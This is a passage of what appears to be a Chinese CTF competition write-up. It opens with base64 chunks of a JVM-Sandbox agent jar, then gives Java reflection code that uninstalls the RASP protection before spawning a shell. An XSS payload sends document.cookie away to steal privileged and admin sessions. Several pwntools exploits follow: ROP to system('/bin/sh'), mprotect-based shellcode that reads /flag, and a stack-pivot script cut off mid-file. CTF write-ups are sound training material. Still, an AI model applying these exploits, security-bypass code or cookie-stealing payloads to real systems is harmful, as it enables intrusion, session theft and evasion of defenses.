ZXlvlXsq7H40PoeuYe05jvD5L1UjGno0JAT&#x2F;go+L1YSshwmxuD6BQtgy6aCGQFPqZxzbqnZlNBBeCYLQywqhwwI2roXGC3w38N2a+g3vCPyESOZxoBxljqbCbosH8c5TdofSLHO2UAPbGsKqaPhJPqPRjoZO4EmRHR3UFi5&#x2F;D&#x2F;E5&#x2F;6kP6y&#x2F;wFb5B939QSwMECgAAAAgACh1GWZNuBnUfFgAAyS8AADEAAABjb20vYWxpYmFiYS9qdm0vc2FuZA&#x3D;&#x3D;”,</p>
+<p>“Ym94L2FnZW50L0FnZW50TGF1bmNoZXIuY2xhc3OtWgl8VNXVP2cykzeZvJAwASQgEpA1q4KghEWSkJBANjMBDKDxkbwkA5OZdGYCpLZudana2iq2Fdxaa0sX2yK0Q4AK2r22drG2dret3fddbal8&#x2F;3Pfm5mXZNj69Se+9+69557tnvVOnn396HEiWumaoJGLqbQ7MlBphILbjG1G5fadA5UxI9yzLbK70ugzw&#x2F;HKank2GUPh7n4z6iM3eTTK1kkjL1PBdmOnURkywn2Vrdu2m91xpuwVwXAwvoopa8HCjTnko1yNdJ3yaAKTrsCDkcr6YMhkyouZg0bUiEeitf1GlIlr&#x2F;WCrQKeJ5Ge6YMDYYdZGwt1GfFMw3o+vWNwIx2NM8xc0pekG4tFguG957cLxc34Ch8LCZJ2m0AVMOSmCTP5M8C4qEurTmJZlojF+KiPVLCrygfQMnS6imUwT+8x4wFJpbW9fmxHvZ5qXAX1GXG6aJRzNZroiw5ZzROKhAi&#x2F;NZfKoE80Bb&#x2F;N1WiAayW2q3tBS29DV3LqmTngu0amUynBS8Ui9acSHomazMch08enZHYoHQ5UAWi7bK3SqpEuYtKAcVijEFFgwBsyBSICiQwNiZI2pTyMejISTyMOmLEF9ke4dZry6pydqxmLLvbQIdmbE40Z3v1C9TKcltBRMQ9EtxoAZGzS6zTTTKdIZdCPbr9BpmWz3YntHZIcZlsnlOq2glTi8XdFg3KxWtNrN2FAIJl57TidxJgnEM5iu1Gm1HEJBe11gQ1NHV31jU11XW3VHgw82WyMuVss0OZPqNwpEnU71tBaaMHcHY+IX8LjNstCo0zq1EIyJo8lUk07NMuXtNsKbRCKNWpmmpTG3D4XjwQGzbne3OSgn4Kdsukosr51pts2C7biZ9dhCNRptgF85QRUpBI0O2iTiXI3lMbg2L9zopc04u7mx5cl&#x2F;Ph9tpWs0ulanLrouyWZGTcKCcWoNkZg6eKZJCzIyt5W26dRNPbBMgLdFonGlrUYf9VKfRv06BWk7Dju9tTEcN&#x2F;tMxAltpxEaMlt7maYsaHQityGAPUQDGoV1itDgqJBokcc59EaiA0Y8c1DZ4piyYmhm&#x2F;XZQVKcYSYQ1BgfNMGQpcaKTEBow3zBkhrtTJwQlWyeg9u&#x2F;UaZcEbU9vaCjWLzPDOr1RzXSHIjGYxJuYCtMYO&#x2F;qjkV3GNjGg6+kGnW6kmxCzjZ6ewNDgoCjfBA9TnTykdsBCNboliQ1sNLamLEtM5VaxhpvEB27X6Q56K8zcTjq1ISMWa4oYPWZURZ78MT6cS3fR3Rq9Tae30z1gZ9QqrKE7ghCCwLLeHB7jO0nlbhYU79TpXroPRgBzGBONMxyCPQ&#x3D;&#x3D;”,</p>
+<p>“pdH9TJecOVsGxonhoz30bpH3PZkzVyb3Fhb36rSPHgSLg0PxMdHf5uecmPbSw0yLwXSFzXQFmK6wma7ojkTNipgZ3WlGK9qikd3DtZgIqLHw&#x2F;ahO76X3IXGGIIqSiWnuWVKXAgPZ98N3ekyE9ciwRh&#x2F;ASY4B8dHjtF+nD9GHgR&#x2F;H0GzG+yOwqNVncRILv5Ni1OwNQdRKCwNIf9QKC42qYuiG&#x2F;X6MPq7RJ3Q6QE&#x2F;CZE+3UyJmeCcywBhPtTV5Fk+1p0Rth3T6pPhVvvKrxt62SCwWhFvIsSZ0OiyWlx01ByI7Tck1R3Q6KglossSmaGTQjMaDpgrdUiwIxKd1ekog8lNp2VKMrJ3Q6WlZm5AuMxoiA&#x2F;DmzwBj2j22G9HKdUbUSghMn9Pp81KcTErvCgwOA8Ai+Qx9UUz2S4iJY4M&#x2F;jPNZ+opGX9XpOfoa05xzSehIIlbU6ojURCJxrBmDDh8JmEa0G2XRNGfKdnCsMh7TN3T6pjA92VFRwV5TXDN9S6cX6NsoHsVgW6NrzN5g2HQQYlp53mWUYzts60XE3TN6k3CEYrU32Idj8tH36FGNvp88irEIvfRD2Go8ktrgpR+rxF0TDPdo9JNROQmaC5kGAuhL9DOdXpZ8rm+z5jZKkvLSL5jc27DTS7+y6pmmSLcR8tJvkL1sJoutuqm414BeeyokGv9Ojvr3Y&#x2F;LJeNU4o7skvT&#x2F;q9CdJqdkhM9wX7&#x2F;fSX5BJrt0aK5kjq3&#x2F;T6e&#x2F;0D8QAZD50DrHTVDKb5dRe0elVgS0Ixloi8RoA7LDWNfoXzjJtEk3B8A6zp8GI9SPa++g18sj2&#x2F;+j0umzPg9rSe+F&#x2F;+E&#x2F;SM7t0zmI3uIsNhoLxzGF44Zbxc17OBoqVcFv26pwjCteCsbqBwfgw6HKuzrpU5gVQNCzNQHFobURi4wk650tx52oNeHkiwviuYFh4KdR5Ek+WSszOVEzTT5&#x2F;HN3sZONz9cGhBWqTzNEE6aU1dfbWUjIHqljU1rVd3NbQ2S&#x2F;3OF+o8gy9i8qVZYlp7hhr8fBoJIVCs8yzRQ04wtgmGFtkV8&#x2F;LFUhtdGVx47ZbKrVuvWbDFKH&#x2F;jNQvVt4&#x2F;n8jyN5+u8gBeOOskoaqfdlXBbVCeIDhpcalA1heVnaTVGbVwuBEp1LuPylKXBxxefrTByYGq2NgFTJV+i8aU6LxL5xrHanETu7hUH48vwNefSqkrZt1TnyyUu6VFzMITeoz4YjcW9vAxqCif7ES8vVwlRnYmX0Vp44tJsePlKJiSLauAbRPAXJdfqvEbwTU3HuXRekFDn5Xr43dzYStTLPm7gRo3XoTrk9UnGHdqrGQqGVOQ7g2bHg8P2m5k6l3f39gmR2HAsbg50DUR6hkKmTOBLvQ&#x3D;&#x3D;”,</p>
+<p>“7ajSJRYq4yEUEw4wSLQzCHTynVKF4hpiturcNiYHNaudIqKYe7vOATH3qUkz3xCoa5dedUOqUWLeoPNGwTJllLIUVZUVuIFqvNypun9V5wQHvbwFZ3FJhfpPcFyj87XcBU6sJFUfjQw429&#x2F;W8ZpLqum&#x2F;8ayNXjYQ9W12BtGNeLkbgeYSOUpT515perzxSDLHP879OgcZDUqhVSHEUWggqa6JDCCASH9mH2PM7B5CvT9cORYGRhLiAY3DOkcYAl10ZnCEUhCqxREHIkNR6aUvHEcivQrkUY5pHNd5iHcm66sMgFZVJinJKgkKFjja&#x2F;A3tTUC0m4c1fqPO14sKdOei1brZ&#x2F;Sy&#x2F;Wecb+EaLzzYjijLDulJKoUyWKwJ8s863CL6cFLAfCW+Wj2&#x2F;j2zW+Q+e38p2jGzdl7Tb2lONJs+OMH+kVOMvdQC+2XyGO4OO38z0av0Pndyr7zrTHUoY9HvaTl2ZpvAe9SBoYGQI6FH4ra1OfyeTH95HHy++GWiKxCnEtEeceyTB7dd4n4qKsaIrsMqO1Rgyamei46emqXlvX0gH5kpdqqnyQOzEnTEdHdW0DxAoE+8LKF5g2jDb3FRnM&#x2F;Xzbo+WrEBcvqG2qDgS6Wuu7alvb6&#x2F;BoqW9cu6G9DhVhaqWtvfXqTmsdUWBjXTsMpK65raOzK9DR3tiCmF2wvq5zVEaEhDLVUt1cF2irrsV4YjJxOuYUjIWyq7ENuTMJI4N8x2JbazuUpieXrWGOAHS0rq9rAabkkj2eKmvgu62uvaOxLpC+4EGsF7eQ9hb1acvQwDYz2iGllZyBlGwbjWhQxvakO94fhMWUn0W7o65ql0uISfcDMBQ07ZZ3Lz9zoXeme7mNkLLX2YKAOYGH4Z4bBmhMMWtx4ut1hNkpo0UfHkyKv+TsZjduRszK1bsL3jcqINj3IYi2wDs5teS4n8CaJySMIOqd6Q5PVQLC3YTREQcKCqDC3gFGbfZzu50NyKLzdxFVH6k+BxpLMRqTkBNO3bT6x9+gYFKRbu1Vvb3V10soGNtNp7SUnltRIhrkeEpLY3oAOO1peiQ4ok011dUASUS1xzLnaI9GX8PbHTTSXBJ4FNu8WW6qjCGJZv7BcX0y5BIl1Y82zuEF&#x2F;5Xt&#x2F;A9uqVGgxWwm8nqc3QEsZsfOgNkneKqjUWMYAmdoPjC7Y2ebEYzaoMnN&#x2F;lGzCoHGP2JqPPsd&#x2F;Tk7TtaA+GPWDrlE023m7Rwx8P9W6Pm0HDh15OGi01btabHPk5+MtHKSka0mRTNDycc0dK714P9SOYi83hXdIfvXNZ9VUllVj39U4K+QvXDC1EWLdbsVy8&#x2F;mv&#x2F;j4r&#x2F;w3jf+u00T+x5i7G7n5sqlZP7vVG93xSBQm8MCCpg&#x3D;&#x3D;”,</p>
+<p>“cYAW0gbEnJAZm9MUiewYOkv5O2qjRPcM4Ge5Y7NR1CLgBRDHUXe9gpjAjC7Fy69BQcxW7+HlfyOfMCPKsh0Xy9XtzHYj6uX&#x2F;IB6NXosNDltLpxAKOTldkY4yXhdD6czJhsbrymIqVj8OFccjxVH101CxJITiqmJO3q54XR4cRApfuc2cS1OzqXsj1QjC0xrDYZRrEjvNmObyMc09J7VrLj1Z0p8WFNHIAqZZhMxFRJNpmlwm4GuadFnq&#x2F;SDezA&#x2F;h20VzMH7YMb6UfPKbocDJz1bqfQe9FeuPyDo&#x2F;Cvj3OuC&#x2F;g&#x2F;H7HOOHMH4sPeZVGL&#x2F;fMZ6C8eOO8RUYf8AxrsL4g47x1Rjvd4w3Y&#x2F;whx&#x2F;g6jD&#x2F;sGG&#x2F;D+COO8QqMPzqGnycc49UY59tysvzcjZWPYVQp10p4e0oOU9aTCvTjeGaryWn8CTx1C4APsKz75Gdge&#x2F;NlUISs+UoOUs5Ryic6MAbDDAcGHx9UDPikT86MoXA8hlmZMMjFqY3hcspSa3mC4SBNOkpTxyOZ60CSl0Ly+TMgmT4eycJMSORqI4XEZSMZoQsVkuLxSMozItl4OoVcPB7DpRkUksOH+JM2hvXA4MI73z&#x2F;nEM0DLwtLR6h8U&#x2F;psJ0BYoq3koWvwfa1CN8Xawp9S6OQrwYdBIodHUojvgKPJzun+S23EzWUjtBj&#x2F;X14mJEaoSohkKSKzYWFE&#x2F;SAShKa3Uy7tgH2EaBINgMR2WGFEES62UKYIT7cJ+xDSj8AfXXzUllbN8DEwWiI&#x2F;ZltM8V5oRQPE&#x2F;cfI13mQVh2m6pbyBK3ZSzPxathLPrzW76OJx6ils&#x2F;wotREdpsCJY9TRWe4+TBur3EVuf6f2FLk7s0oCne7SQKenLEFbAp3ZeBkjZAZGaEeC3rCpyJ2gIXns3k9FVR77S6&#x2F;KLvIUZSfozUWeE&#x2F;spv8othIqA+i0nnoRsy6iXwnQ9DdIQ7ca7gm6FIm+2tbSO5G9EboB2boTt3wSt3AyN3KKgltFt1ER3UoDuos10Ow7rNjLo7cB3DzDeiv&#x2F;eCUz3AOIdtIf2KG2ugjaW0Xr+NEMgrPj4OJ9Q8fF+XmZr+H5eKXFBfT3Nz0CfuXQnf4Y&#x2F;C54+h9m15D1JxRr58k7RlfLnMSH1bytmNOog1uj6U5RD2WMWMK3WvK+Rq0ajm3NxTC&#x2F;Qt3GAYjsftW1n9UG6reQI3emivVTM1uAdLvoAFaa+n6Y9zftp6jHa01lSepje1SwrZUfogSzaVHYgZWDTICohDE+kh6mIHqGF9H5aTI9DBfuVKkpAcR5gP89fULa9OqWA1fxFpYDFcEC1qsTOIdfCkzRJgya&#x2F;hKEbANfD5b9MtbYIX7FFaHZy2sSlHyT3k6X+hxL0SHOZ&#x2F;7Gspw&#x3D;&#x3D;”,</p>
+<p>“6PEEfbDM&#x2F;xH7i&#x2F;GGqTxhvzaVJuigheFTLlJe6VbyzAMHRAcpjw7BKD4JcxiBjEeolI5Cpqeoho7DHE44nKbZligPEj0LORjwi&#x2F;kr&#x2F;FWH01gzz9kyIuifpMLRIpbI37hYIrqegU7z4FST4dyLm&#x2F;EYacHjWJUbz+NVntJj9Eyn+FmRZ4Q+C087TF84Ql92UZlMfH2EnoczZPu&#x2F;k6DvVmlFmv8HHqigM8sfgl&#x2F;hIcrwKEcrcmOmHBNPVHmx4SHZkFOUM05nVT5M&#x2F;sieLPLZs0&#x2F;TSwn66dLcybn7qAEAP7fIFGlC5tmAArXpeJVHi9r304wqHcCPjcW2qUg&#x2F;gflfjqey9UCVR5zZ&#x2F;+siz2H67QmY0UfoeZj09Sh3ssXW7aO7RQI97MNDX0WUeo4K6BsIqM+jNvkW1Ps8FPxdWkTfpyV4V9FLsKifwYtfRkT8JcXpN&#x2F;Qm+i28+Xfw1z&#x2F;CE&#x2F;4KKn+nT9M&#x2F;6Gv0T+z+Fyi+Qi&#x2F;Sq&#x2F;R7eo3+RKfoFfVbEHM2nWKN3ZzDHmUW9yCcv0hT+Wv8dZK&#x2F;EfsLXwAD8YDmczCQb+Bwa+lz&#x2F;E0YiAbaD&#x2F;Hz&#x2F;C2YRBzmIEaTA&#x2F;o38AuY84GLbfRj&#x2F;jblcg7p&#x2F;B3g84hZqIhM6suK0h4uUEboQqTJ5RfxlQXdePi7+HIrIxRTtag+B6oWrefE1AUbojkpw2ygrFMQU9foLo2eTUYW69&#x2F;3NHpcI7f1ZBVjik6JXGOA1YpdvX0PMrwKDVqJa6udU6dzCUqwkgT94REqKPH&#x2F;OUF&#x2F;3Ueaez+5s55IxRX5IzXiYsrmWciCs1EDFTsS7nT+vvicYtpDrqLVkpdeT1GqsaspKQH+OR63SuA8b1QJMApfruCTn+FsfJsB5Eri20taCfCVHhjDawlpXIqjKsNRlTiyuY1bff1AlYJCRRMqoi6f&#x2F;G2c5fh8FRBJvr7xGL3WeZj+3QR6J&#x2F;eSp&#x2F;RAif9Ugrm57Pg+GZW1lB9f6s5a6pnsmex+jK4qn+xZJD6voLP3U1VRdiF7sEH8&#x2F;7jnvbSwSMtahNV9NLNIcy9KwvlLZV5mrLh+q4f3n&#x2F;q4ksxyqXrEdeJL0AItxilchtR&#x2F;BQx7GerJKpqJBLYEBe5KvhKRr5rWcQ1t4FrqQi1mch3181raBZg38zqljcug2XUovH7IP4L0S6iGfwxtSPa40S47vIAX02bUjn38EuDSEVStwVAt7S0g7SRNhOWdpDyNf&#x2F;I6efFkRNULoNKTNB+j12jCq3AMyxB&#x2F;iuOcwRfZKeQunItE7lliiDNKjsB7aR9NKim100mobIR9OOKytCKsI26lCerHpauQNFscKWAW&#x2F;8zySHy9bGf1Wfxz8ciUAAoq5Wk4&#x2F;ply&#x2F;DZ&#x2F;vwB&#x2F;s5DyLXObrewGZeVBzg&#x3D;&#x3D;”,</p>
+<p>“K+SCBPvFdtlhu5tgNk&#x2F;TUlueR8GEsFFeUshTDvLUEZ7eNMIz99KMQp49wnNKE1zSXJbgir2UW1bIixO8pMlxyCqF81aY7jU44GvpQu6ii9HplHJ3SsYLcfy&#x2F;5F8pxsrt+JNLs1VkY4eM5Y5ootJcaVrIX4PpJSmm19q1fi6YvqKQq8B02qMsKfsdHpprEXWQyrVJpZEvy4h8RSGvyoB84DyRH00hD9jI84F8taTkEa4ZRUBV9hyF9Q0BUdRBKH8cofyxhOQ3Q5vQfVChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi&#x2F;hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5&#x2F;kN0WyG&#x2F;a4Tfk+AHDnHekyk3t&#x2F;q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW&#x2F;8h&#x2F;wvsKNIl&#x2F;xu5&#x2F;quer6vkv9Typnq&#x2F;LEwlYni71dKtntkso+fCV48p15VHR&#x2F;wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA&#x2F;UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA&#x2F;UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg&#x3D;&#x3D;”,</p>
+<p>“WY30FLFvBQAAzQsAADYAAAAAAAAAAAAAALSBCwIAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc1BLAQIUAwoAAAAIAAodRlmTbgZ1HxYAAMkvAAAxAAAAAAAAAAAAAAC0gc4HAABjb20vYWxpYmFiYS9qdm0vc2FuZGJveC9hZ2VudC9BZ2VudExhdW5jaGVyLmNsYXNzUEsFBgAAAAAJAAkAeAIAADweAAAAAFChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi&#x2F;hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5&#x2F;kN0WyG&#x2F;a4Tfk+AHDnHekyk3t&#x2F;q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW&#x2F;8h&#x2F;wvsKNIl&#x2F;xu5&#x2F;quer6vkv9Typnq&#x2F;LEwlYni71dKtntkso+fCV48p15VHR&#x2F;wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA&#x2F;UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA&#x2F;UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg&#x3D;&#x3D;”]</p>
+<p>with open(“agent.jar”, “ab+”) as f:</p>
+<p>for i in data:</p>
+<p>f.write(base64.b64decode(i))</p>
+<p>对agent.jar进行审计，发现源JVM-SANDBOX项目，发现在启动类中有一个uninstall方法，用来指定删除模块。当前RASP功能默认模块是default，于是想试试能不能直接这么卸载RASP，payload如下，之后就可以直接开始执行命令</p>
+<p>JSON</p>
+<p>try {</p>
+<p>&#x2F;&#x2F; 使用类加载器动态加载 AgentLauncher 类</p>
+<p>Class agentLauncherClass &#x3D; Class.forName(“com.alibaba.jvm.sandbox.agent.AgentLauncher”);</p>
+<p>&#x2F;&#x2F; 获取 uninstall 方法</p>
+<p>System.out.println(agentLauncherClass);</p>
+<p>String className &#x3D;Thread.currentThread().getStackTrace()[1].getClassName();</p>
+<p>System.out.println(“当前类名: ” + className);</p>
+<p>java.lang.reflect.Method uninstallMethod &#x3D; agentLauncherClass.getDeclaredMethod(“uninstall”, String.class);</p>
+<p>uninstallMethod.invoke(null, “default”);</p>
+<p>System.out.println(“Sandbox 卸载成功！”);</p>
+<p>} catch (Exception e) {</p>
+<p>System.err.println(“调用卸载方法时出错: ” + e.getMessage());</p>
+<p>e.printStackTrace();</p>
+<p>}</p>
+<p>测试了半天的回显，发现可以直接bash弹shell了</p>
+<p>Spreader</p>
+<p>Content分两次上传</p>
+<p>Python</p>
+<p>&lt;&gt;          fetch(‘&#x2F;store’,{method:’POST’,headers:{‘Content-Type’:’application&#x2F;x-www-form-urlencoded’},body:<br>encodeURIComponent(document.cookie)});&#x2F;*</p>
+<p>*&#x2F;</p>
+<p>拿完privileged的Cookies，再以privileged的身份上传上述的Payload，再拿admin的Cookies。</p>
+<p>Pwn:</p>
+<p>qwen</p>
+<p>pwn1：</p>
+<p>栈溢出修改error_trigger函数指针为后门</p>
+<p>触发error到后门</p>
+<p>通过open(“&#x2F;proc&#x2F;self&#x2F;maps”)，泄露libc和pie</p>
+<p>回到主程序，继续修改函数指针，观察劫持控制流的现场，并抬栈到buf，打rop</p>
+<p>Python</p>
+<p>from pwn import *</p>
+<p>context(os&#x3D;’linux’, arch&#x3D;’amd64′, log_level&#x3D;’debug’)</p>
+<p>while True:</p>
+<p>#p &#x3D; process(‘.&#x2F;pwn’)</p>
+<p>elf &#x3D; ELF(‘.&#x2F;pwn’)</p>
+<p>p &#x3D;remote(‘pwn-848a8a75eb.challenge.xctf.org.cn’, 9999,ssl&#x3D;True)</p>
+<p>libc &#x3D; ELF(‘.&#x2F;libc-2.27.so’)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 0′)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 1′)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 2′)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 3′)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 4′)</p>
+<p>p.sendafter(‘Is there anything you want to say?’,b’a’*0x8+b’x08’b’x15′)</p>
+<p>p.sendlineafter(‘Do you want to end the game [Y&#x2F;N]’,’N’)</p>
+<p>try:</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’14 15′)</p>
+<p>p.sendlineafter(‘Please enter the administrator key’,’1804289383′)</p>
+<p>sleep(0.2)</p>
+<p>p.sendline(‘&#x2F;proc&#x2F;self&#x2F;maps’)</p>
+<p>p.recvuntil(‘The debugging information is as follows &gt;&gt;n’)</p>
+<p>pie &#x3D; int(p.recvline()[:12],16)</p>
+<p>print(‘[*] pie &#x3D; ‘,hex(pie))</p>
+<p>pop_rdi_ret &#x3D;pie+0x19b3</p>
+<p>leave_ret &#x3D; pie + 0x1944</p>
+<p>ret &#x3D; pie +0x1945</p>
+<p>call_read &#x3D; pie +0x18ad</p>
+<p>p.recvline()</p>
+<p>p.recvline()</p>
+<p>libc_base &#x3D; int(p.recvline()[:12],16)</p>
+<p>add_rsp_0x68_ret &#x3D; libc_base + 0x000000000010fc5e</p>
+<p>system_addr &#x3D; libc_base + libc.symbols[‘system’]</p>
+<p>binsh_addr &#x3D; libc_base + next(libc.search(‘&#x2F;bin&#x2F;sh’))</p>
+<p>print(‘[*] libc &#x3D; ‘,hex(libc_base))</p>
+<p>”’</p>
+<p>0x4f2a5 execve(“&#x2F;bin&#x2F;sh”, rsp+0x40, environ)</p>
+<p>constraints:</p>
+<p>rsp &amp; 0xf &#x3D;&#x3D; 0</p>
+<p>rcx &#x3D;&#x3D; NULL</p>
+<p>0x4f302 execve(“&#x2F;bin&#x2F;sh”, rsp+0x40, environ)</p>
+<p>constraints:</p>
+<p>[rsp+0x40] &#x3D;&#x3D; NULL</p>
+<p>0x10a2fc execve(“&#x2F;bin&#x2F;sh”, rsp+0x70, environ)</p>
+<p>constraints:</p>
+<p>[rsp+0x70] &#x3D;&#x3D; NULL</p>
+<p>”’</p>
+<p>ogg &#x3D; libc_base + 0x4f2a5</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 0′)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 1′)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 2′)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 3′)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 4′)</p>
+<p>p.sendafter(‘Is there anything you want to say?’,b’a’*0x8+p64(add_rsp_0x68_ret)+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(binsh_addr) + p64(system_addr))</p>
+<p>p.sendlineafter(‘Do you want to end the game [Y&#x2F;N]’,’N’)</p>
+<p>#gdb.attach(p,’b *$rebase(0x1022)nc’)</p>
+<p>p.sendlineafter(‘请输入下棋的位置（行 列）：’,’14 15′)</p>
+<p>break</p>
+<p>except:</p>
+<p>p.close()</p>
+<p>continue</p>
+<p>p.sendline(‘cd home&#x2F;ctf&#x2F;’)</p>
+<p>p.interactive()</p>
+<p>pwn2：</p>
+<p>一个压缩程序，可以将flag打包成可读文件，打包后直接cat即可</p>
+<p>base64解码过后可以得到flag</p>
+<p>ezcode</p>
+<p>先通过mprotect修改将shellcode地址权限改成7，再通过jmp回到syscall，并提前布置好参数来实现read，读0xf大小</p>
+<p>通过第一次read，布置好第二次read，并jmp跳转过去，第二次read长度可控</p>
+<p>最后orw</p>
+<p>Python</p>
+<p>from pwn import *</p>
+<p>import json</p>
+<p>context(os&#x3D;’linux’, arch&#x3D;’amd64′, log_level&#x3D;’debug’)</p>
+<p>p &#x3D; process(‘.&#x2F;pwn’)</p>
+<p>elf &#x3D; ELF(‘.&#x2F;pwn’)</p>
+<p>#p &#x3D; remote(“pwn-6bc8a8d329.challenge.xctf.org.cn”, 9999, ssl&#x3D;True)</p>
+<p>”’</p>
+<p>&#x2F;&#x2F;mprotect(0x9998000, _ ,7)  13 bytes</p>
+<p>mov ax,0xa</p>
+<p>shl edi,12</p>
+<p>mov dx, 0xf</p>
+<p>syscall</p>
+<p>&#x2F;&#x2F;read    9 bytes</p>
+<p>xor edi,edi</p>
+<p>shl esi,12</p>
+<p>xor eax,eax</p>
+<p>jmp short  &#x2F;&#x2F; 跳转回上一个 syscall</p>
+<p>”’</p>
+<p>gdb.attach(p,’b *$rebase(0x15e0)nb *$rebase(0x18a6)nc’)</p>
+<p>payload &#x3D; ’66b80a00c1e70c66ba0f000f05′</p>
+<p>payload +&#x3D; ’31ffc1e60c31c0ebf5′</p>
+<p>shellcode &#x3D; ‘{“shellcode”: “‘</p>
+<p>shellcode +&#x3D; payload</p>
+<p>shellcode +&#x3D; ‘”}’</p>
+<p>p.sendlineafter(‘ input:’,shellcode)</p>
+<p>print(“[*] length is “,hex(len(payload)))</p>
+<p>”’</p>
+<p>xor eax, eax</p>
+<p>mov dx, 0xf0</p>
+<p>syscall</p>
+<p>”’</p>
+<p>p.send(b’1xc0fxbaxf0x00x0fx05′.ljust(0xd, b’x90′) + b’xebxf1′)</p>
+<p>payload &#x3D; shellcraft.open(‘&#x2F;flag’) + shellcraft.read(‘rax’, 0x9998f00, 0x100) + shellcraft.write(1, 0x9998f00, 0x100)</p>
+<p>p.sendline(b’a’ * 8 + asm(‘shl esp, 12; add esp, 0x200’) + asm(payload))</p>
+<p>p.interactive()</p>
+<p>signin_revenge</p>
+<p>vuln函数中存在0x30字节的栈溢出，第一次利用栈溢出劫持控制流到puts函数泄露libc地址，并回到vuln；第二次利用栈溢出劫持控制流到gets，向data段读入字符串和ROP并最终回到vuln；第三次利用栈溢出劫持控制流、使用ROP：pop_rbp+data段地址+leave_ret实现栈迁移，最终orw读出flag；</p>
+<p>Python</p>
+<p>from pwn import *</p>
+<p>import sys</p>
+<p>file &#x3D; “.&#x2F;vuln”</p>
+<p>if len(sys.argv) &#x3D;&#x3D; 1 or sys.argv[1] &#x3D;&#x3D; ‘l’:</p>
+<p>sh &#x3D; process(file)</p>
+<p>elif sys.argv[1] &#x3D;&#x3D; ‘r’:</p>
+<p>sh &#x3D; remote(“pwn-6fc638b866.challenge.xctf.org.cn”, 9999, ssl&#x3D;True)</p>
+<p>elf &#x3D; ELF(file)</p>
+<p>def ru(string):</p>
+<p>sh.recvuntil(string)</p>
+<p>def dbg():</p>
+<p>if len(sys.argv) &gt; 1 and sys.argv[1] &#x3D;&#x3D; ‘r’:</p>
+<p>return</p>
+<p>gdb.attach(sh)</p>
+<p>pause()</p>
+<p>def sl(content):</p>
+<p>sh.sendline(content)</p>
+<p>def itr():</p>
